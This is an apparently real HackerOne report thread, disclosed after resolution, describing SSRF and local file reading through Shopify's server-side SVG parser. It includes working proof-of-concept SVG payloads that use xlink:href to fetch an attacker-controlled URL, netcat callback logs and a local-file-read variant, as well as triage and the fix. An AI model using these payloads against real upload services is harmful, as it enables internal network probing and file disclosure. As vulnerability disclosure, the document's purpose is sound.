title: SVG parser loads external resources on image upload

profile.name: Shopify
profile.about: Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.

vulnerability_information:
Uploading SVG that include

```
 <image xlink:href="http://example.com/?evil=var" />
```

will cause the server side parser to try to fetch external resources.

I've tested in two ways. Creating an svg with an external loaded public google image that was rendered perfectly. 

Also tested a private server with nc and created an svg that uses xlink for private url. I uploaded the svg and nc output was this. 

```
Listening on [0.0.0.0] (family 0, port 3001)
Connection from [23.227.55.103] port 3001 [tcp/*] accepted (family 2, sport 49391)
GET /?evil=var HTTP/1.0
Host: 37.139.18.151:3001
Accept-Encoding: gzip
```

activities.message: I don't have enough information to reproduce this issue here. Please send all necessary step by step instruction for us to reproduce the issue, for the two ways that you mentioned in your description.

Step by step:

- Prepare svg file with xlink. Below is the exact file I used, it contains tags that might not be need to trigger the fetch. Important bit is `xlink:href` at image tag. Replace http://37.139.18.xxx:3001/?evil=var for a external resource you want to hit. 37.139.18.xxx:3001 is just my testing server.

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
   xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
   style="overflow: hidden; position: relative;"
   width="300"
   version="1.1"
   height="200"
   id="svg3202"
   inkscape:version="0.48.4 r9939"
   sodipodi:docname="googleExt.svg">
  <metadata
     id="metadata3212">
    <rdf:RDF>
      <cc:Work
         rdf:about="">
        <dc:format>image/svg+xml</dc:format>
        <dc:type
           rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
      </cc:Work>
    </rdf:RDF>
  </metadata>
  <defs
     id="defs3210" />
  <sodipodi:namedview
     pagecolor="#ffffff"
     bordercolor="#666666"
     borderopacity="1"
     objecttolerance="10"
     gridtolerance="10"
     guidetolerance="10"
     inkscape:pageopacity="0"
     inkscape:pageshadow="2"
     inkscape:window-width="640"
     inkscape:window-height="480"
     id="namedview3208"
     showgrid="false"
     inkscape:zoom="1.0666667"
     inkscape:cx="150"
     inkscape:cy="100"
     inkscape:window-x="49"
     inkscape:window-y="24"
     inkscape:window-maximized="0"
     inkscape:current-layer="svg3202" />
  <image
     x="10"
     y="10"
     width="276"
     height="110"
     xlink:href="http://37.139.18.151:3001/?evil=var"
     stroke-width="1"
     id="image3204" />
  <rect
     x="0"
     y="150"
     height="10"
     width="300"
     style="fill: #000000"
     id="rect3206" />
</svg>
```

- On the test server, just for logging purposes:

```
root@whtest:/opt/mean# netcat -l -p 3001 -v
Listening on [0.0.0.0] (family 0, port 3001)
```

- Upload .svg file to product sheet. On the test server you can see the hit.

```
Connection from [23.227.55.111] port 3001 [tcp/*] accepted (family 2, sport 56279)
GET /?evil=var HTTP/1.0
Host: 37.139.18.151:3001
Accept-Encoding: gzip
```

If you replace the xlink:href for a public image, (i used: http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif), the svg parser will fetch the image and output a png with the google logo.

Just noticed a Markdown parsing error in this line of the svg file:
```
style="fill: #000000"
```
should be:
style="fill: #000000"

Also, just to clarify; this is a SSRF issue.
https://cwe.mitre.org/data/definitions/918.html

Excuse the Inkscape file mess before. Here is a cleaned up version of the .svg file that fetches a public image at google.

- Save this as .svg

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="300"
   height="200">

  <image
     x="10"
     y="10"
     width="276"
     height="110"
     xlink:href="http://images.google.com/intl/es_ALL/images/logos/images_logo_lg.gif"
     stroke-width="1"
     id="image3204" />
  <rect
     x="0"
     y="150"
     height="10"
     width="300"
     style="fill: black"/>
</svg>
```

- Create/save a product

- Add image uploading the .svg

_What happens_
Server reads href, fetches the document from google in the context of the svg server side parser program, leading to SSRF and possibly other vectors.

_What should happen_
Server refuses to process svg or aggressively sanitizes xlink, xmlns, xlst, DTD and other XML attack vectors.

Let me know if you need something else.

Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Our team is busy triaging and fixing HackerOne reports, and it may take us up to 1 week (or more) to triage any given issue. Don't worry, we'll get to yours!

While you are waiting, you can read over our list of non applicable issues listed on our program page: https://hackerone.com/shopify. Make sure your issue isn't listed!

I tested the steps you suggested and I cannot reproduce this issue. At this point, a video would help greatly so I can understand your testing method. Also please specify the name of  the store where you tested this issue from.

The store is https://whitehatgsl.myshopify.com 
The product with google images was created using the above svg file.

I'll make a video but could you specify what you cannot reproduce? Does the .svg file uploads?  Does it shows a black line img only without fetching the google part?

It works for me every time. You parser seems to break on minor svg changes, so please, check that the file you are using is the same I posted last. Also remember to save the product before uploading the svg.

I'll get back with a vid, but might take some hours, if you could answer this before I would apreciate.
I get an error back from Shopify during the upload process (422), and I see no connection to the URL I specified. I used the last svg example you sent.

I've got that 422 too, when testing other malformed svgs.  But the one posted above worked again right now. I'm guessin it might be a copy-paste on mac creating newlines chars I did not test. 

Could you please try sublime + ubuntu + chrome to perform the steps?

I'll also place a copy of the exact svg on my store files so you can try it instead of creating your own:
https://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg

Here is the video I made for you:

https://drive.google.com/file/d/0B92V0Fvc4gjYTndYTUdRZ0JoTGM/view?usp=sharing

Let me know when you have it to take down the link asap.

Also, excuse me for butchering your name. I hope my english is clear enough.
I downloaded the video, so you can delete it. It may take until next week for me to get back to this issue, sorry for the delay.

I want to add another, more significant, proof of concept.

You can actually __read images from the local system__ using this method. Change the href to the following `/lib/plymouth/ubuntu_logo.png`
That will load a local file from your server that I can see.

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   xmlns:xlink="http://www.w3.org/1999/xlink"
   style="overflow: hidden; position: relative;"
   width="300"
   height="200">

  <image
     x="10"
     y="10"
     width="276"
     height="110"
     xlink:href="/lib/plymouth/ubuntu_logo.png"
     stroke-width="1"/>
  <rect
     x="0"
     y="150"
     height="10"
     width="300"
     style="fill: black"/>
</svg>
```

Here it is a screenshot on how that .svg file renders after uploading:
https://drive.google.com/file/d/0B92V0Fvc4gjYLUdFSmlsTThLQTA

Thanks for the video, I managed to reproduce using the example you uploaded at https://cdn.shopify.com/s/files/1/1046/6164/files/minimalGoogleLoad.svg. I'm not sure why I had a 422 response before, I suspect markdown is changing the formatting and copy/pasting the xml from your comment didn't work.
I opened an issue for our engineering team and we'll look into the best way of fixing this. Thank you for bringing the issue to our attention!

Glad to help.

During my research on this .svg vector I found two resources with on-spot information. A paper and a slide presentation that might help you too. They both include defense strategies, even for ruby stacks.

http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
https://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf

Btw, easter egg. If you change the `xlink` to `magick:logo` so it reads `xlink:href="magick:logo"` the server will output the GraphicsMagick frog logo that you use over there. I even thought to american-fuzzy-lop the svg parser lib ;)
Hi. It's been a month. Any updates?
We are still investigating this and will get back to you when we have something more to report. Thank you for your patience.

Thanks again for your report.

We have resolved this issue by adding additional input validation to limit image attachments to a white list of acceptable image types.

Our next round of bounty decisions will take place within two weeks, so we will be in touch with you again soon.
Thanks for helping improve the security of Shopify. This issue has been resolved.
Thanks for the bounty.
